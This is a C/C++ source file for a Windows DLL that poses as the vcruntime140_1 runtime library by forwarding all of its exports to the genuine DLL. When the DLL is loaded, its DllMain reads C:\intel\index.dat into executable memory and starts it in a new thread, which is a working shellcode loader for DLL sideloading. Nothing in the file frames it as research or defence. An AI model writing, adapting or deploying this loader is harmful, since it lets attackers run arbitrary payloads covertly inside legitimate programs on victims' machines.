#include <Windows.h>
#include <stdio.h>
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);
		HANDLE hFile = CreateFileA("C:\\intel\\index.dat", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			printf("Open File Error!%d\n", GetLastError());
			char buff[256] = { 0 };
			sprintf_s(buff, "Open File Error!%d", GetLastError());
			MessageBoxA(0, "Open File Error!", buff, 0);
			return -1;
		}
		DWORD dwSize;
		dwSize = GetFileSize(hFile, NULL);
		LPVOID lpAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (lpAddress == NULL)
		{
			MessageBoxA(0, "VirtualAlloc error", "0", 0);
			printf("VirtualAlloc error:%d,getfilesize-%d\n", GetLastError(), dwSize);
			return -1;
		}
		DWORD dwRead;
		ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);
		auto thba = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpAddress, 0, 0, 0);
	}
	else if (dwReason == DLL_PROCESS_DETACH)
	{
	}

	return TRUE;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// µ¼³öº¯Êý
#pragma comment(linker, "/EXPORT:_CreateFrameInfo=vcruntime140_1._CreateFrameInfo,@1")
#pragma comment(linker, "/EXPORT:_CxxThrowException=vcruntime140_1._CxxThrowException,@2")
#pragma comment(linker, "/EXPORT:_FindAndUnlinkFrame=vcruntime140_1._FindAndUnlinkFrame,@3")
#pragma comment(linker, "/EXPORT:_IsExceptionObjectToBeDestroyed=vcruntime140_1._IsExceptionObjectToBeDestroyed,@4")
#pragma comment(linker, "/EXPORT:_SetWinRTOutOfMemoryExceptionCallback=vcruntime140_1._SetWinRTOutOfMemoryExceptionCallback,@5")
#pragma comment(linker, "/EXPORT:__AdjustPointer=vcruntime140_1.__AdjustPointer,@6")
#pragma comment(linker, "/EXPORT:__BuildCatchObject=vcruntime140_1.__BuildCatchObject,@7")
#pragma comment(linker, "/EXPORT:__BuildCatchObjectHelper=vcruntime140_1.__BuildCatchObjectHelper,@8")
#pragma comment(linker, "/EXPORT:__C_specific_handler=vcruntime140_1.__C_specific_handler,@9")
#pragma comment(linker, "/EXPORT:__C_specific_handler_noexcept=vcruntime140_1.__C_specific_handler_noexcept,@10")
#pragma comment(linker, "/EXPORT:__CxxDetectRethrow=vcruntime140_1.__CxxDetectRethrow,@11")
#pragma comment(linker, "/EXPORT:__CxxExceptionFilter=vcruntime140_1.__CxxExceptionFilter,@12")
#pragma comment(linker, "/EXPORT:__CxxFrameHandler=vcruntime140_1.__CxxFrameHandler,@13")
#pragma comment(linker, "/EXPORT:__CxxFrameHandler2=vcruntime140_1.__CxxFrameHandler2,@14")
#pragma comment(linker, "/EXPORT:__CxxFrameHandler3=vcruntime140_1.__CxxFrameHandler3,@15")
#pragma comment(linker, "/EXPORT:__CxxQueryExceptionSize=vcruntime140_1.__CxxQueryExceptionSize,@16")
#pragma comment(linker, "/EXPORT:__CxxRegisterExceptionObject=vcruntime140_1.__CxxRegisterExceptionObject,@17")
#pragma comment(linker, "/EXPORT:__CxxUnregisterExceptionObject=vcruntime140_1.__CxxUnregisterExceptionObject,@18")
#pragma comment(linker, "/EXPORT:__DestructExceptionObject=vcruntime140_1.__DestructExceptionObject,@19")
#pragma comment(linker, "/EXPORT:__FrameUnwindFilter=vcruntime140_1.__FrameUnwindFilter,@20")
#pragma comment(linker, "/EXPORT:__GetPlatformExceptionInfo=vcruntime140_1.__GetPlatformExceptionInfo,@21")
#pragma comment(linker, "/EXPORT:__NLG_Dispatch2=vcruntime140_1.__NLG_Dispatch2,@22")
#pragma comment(linker, "/EXPORT:__NLG_Return2=vcruntime140_1.__NLG_Return2,@23")
#pragma comment(linker, "/EXPORT:__RTCastToVoid=vcruntime140_1.__RTCastToVoid,@24")
#pragma comment(linker, "/EXPORT:__RTDynamicCast=vcruntime140_1.__RTDynamicCast,@25")
#pragma comment(linker, "/EXPORT:__RTtypeid=vcruntime140_1.__RTtypeid,@26")
#pragma comment(linker, "/EXPORT:__TypeMatch=vcruntime140_1.__TypeMatch,@27")
#pragma comment(linker, "/EXPORT:__current_exception=vcruntime140_1.__current_exception,@28")
#pragma comment(linker, "/EXPORT:__current_exception_context=vcruntime140_1.__current_exception_context,@29")
#pragma comment(linker, "/EXPORT:__intrinsic_setjmp=vcruntime140_1.__intrinsic_setjmp,@30")
#pragma comment(linker, "/EXPORT:__intrinsic_setjmpex=vcruntime140_1.__intrinsic_setjmpex,@31")
#pragma comment(linker, "/EXPORT:__processing_throw=vcruntime140_1.__processing_throw,@32")
#pragma comment(linker, "/EXPORT:__report_gsfailure=vcruntime140_1.__report_gsfailure,@33")
#pragma comment(linker, "/EXPORT:__std_exception_copy=vcruntime140_1.__std_exception_copy,@34")
#pragma comment(linker, "/EXPORT:__std_exception_destroy=vcruntime140_1.__std_exception_destroy,@35")
#pragma comment(linker, "/EXPORT:__std_terminate=vcruntime140_1.__std_terminate,@36")
#pragma comment(linker, "/EXPORT:__std_type_info_compare=vcruntime140_1.__std_type_info_compare,@37")
#pragma comment(linker, "/EXPORT:__std_type_info_destroy_list=vcruntime140_1.__std_type_info_destroy_list,@38")
#pragma comment(linker, "/EXPORT:__std_type_info_hash=vcruntime140_1.__std_type_info_hash,@39")
#pragma comment(linker, "/EXPORT:__std_type_info_name=vcruntime140_1.__std_type_info_name,@40")
#pragma comment(linker, "/EXPORT:__telemetry_main_invoke_trigger=vcruntime140_1.__telemetry_main_invoke_trigger,@41")
#pragma comment(linker, "/EXPORT:__telemetry_main_return_trigger=vcruntime140_1.__telemetry_main_return_trigger,@42")
#pragma comment(linker, "/EXPORT:__unDName=vcruntime140_1.__unDName,@43")
#pragma comment(linker, "/EXPORT:__unDNameEx=vcruntime140_1.__unDNameEx,@44")
#pragma comment(linker, "/EXPORT:__uncaught_exception=vcruntime140_1.__uncaught_exception,@45")
#pragma comment(linker, "/EXPORT:__uncaught_exceptions=vcruntime140_1.__uncaught_exceptions,@46")
#pragma comment(linker, "/EXPORT:__vcrt_GetModuleFileNameW=vcruntime140_1.__vcrt_GetModuleFileNameW,@47")
#pragma comment(linker, "/EXPORT:__vcrt_GetModuleHandleW=vcruntime140_1.__vcrt_GetModuleHandleW,@48")
#pragma comment(linker, "/EXPORT:__vcrt_InitializeCriticalSectionEx=vcruntime140_1.__vcrt_InitializeCriticalSectionEx,@49")
#pragma comment(linker, "/EXPORT:__vcrt_LoadLibraryExW=vcruntime140_1.__vcrt_LoadLibraryExW,@50")
#pragma comment(linker, "/EXPORT:_get_purecall_handler=vcruntime140_1._get_purecall_handler,@51")
#pragma comment(linker, "/EXPORT:_get_unexpected=vcruntime140_1._get_unexpected,@52")
#pragma comment(linker, "/EXPORT:_is_exception_typeof=vcruntime140_1._is_exception_typeof,@53")
#pragma comment(linker, "/EXPORT:_local_unwind=vcruntime140_1._local_unwind,@54")
#pragma comment(linker, "/EXPORT:_purecall=vcruntime140_1._purecall,@55")
#pragma comment(linker, "/EXPORT:_set_purecall_handler=vcruntime140_1._set_purecall_handler,@56")
#pragma comment(linker, "/EXPORT:_set_se_translator=vcruntime140_1._set_se_translator,@57")
#pragma comment(linker, "/EXPORT:longjmp=vcruntime140_1.longjmp,@58")
#pragma comment(linker, "/EXPORT:memchr=vcruntime140_1.memchr,@59")
#pragma comment(linker, "/EXPORT:memcmp=vcruntime140_1.memcmp,@60")
#pragma comment(linker, "/EXPORT:memcpy=vcruntime140_1.memcpy,@61")
#pragma comment(linker, "/EXPORT:memmove=vcruntime140_1.memmove,@62")
#pragma comment(linker, "/EXPORT:memset=vcruntime140_1.memset,@63")
#pragma comment(linker, "/EXPORT:set_unexpected=vcruntime140_1.set_unexpected,@64")
#pragma comment(linker, "/EXPORT:strchr=vcruntime140_1.strchr,@65")
#pragma comment(linker, "/EXPORT:strrchr=vcruntime140_1.strrchr,@66")
#pragma comment(linker, "/EXPORT:strstr=vcruntime140_1.strstr,@67")
#pragma comment(linker, "/EXPORT:unexpected=vcruntime140_1.unexpected,@68")
#pragma comment(linker, "/EXPORT:wcschr=vcruntime140_1.wcschr,@69")
#pragma comment(linker, "/EXPORT:wcsrchr=vcruntime140_1.wcsrchr,@70")
#pragma comment(linker, "/EXPORT:wcsstr=vcruntime140_1.wcsstr,@71")
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

